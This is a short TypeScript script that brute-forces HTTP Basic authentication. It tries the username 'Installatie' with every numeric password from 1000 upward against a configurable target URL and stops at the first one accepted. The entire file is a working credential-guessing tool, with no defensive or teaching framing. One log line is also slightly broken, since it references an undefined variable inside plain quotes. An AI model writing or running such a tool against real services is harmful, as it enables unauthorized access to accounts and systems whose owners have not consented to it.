import dotenv from 'dotenv'
dotenv.config({ path: '.env' })

import { envString } from './env'
import log from './log'
import axios from 'axios'
;(async () => {
  const targetUrl = envString('TARGET_URL', 'http://localhost:3030/posts')
  log.info('⚡️ App started for url ${url}')

  for (let i = 1000; i < 999999999999; i++) {
    const token = Buffer.from(`Installatie:${i}`).toString('base64')
    const config = {
      headers: {
        Authorization: `Basic ${token}`,
        accept: 'application/json'
      }
    }

    try {
      const resp = await axios.get(targetUrl, config)
      log.info(`${resp.status} ${resp.statusText} Auth Installatie:${i}`)
      break
    } catch (e: Error | unknown) {
      log.info(`${e} Auth Installatie:${i} ${targetUrl}`)
    }
    await sleep(50)
  }
})()

function sleep(ms: number) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms)
  })
}
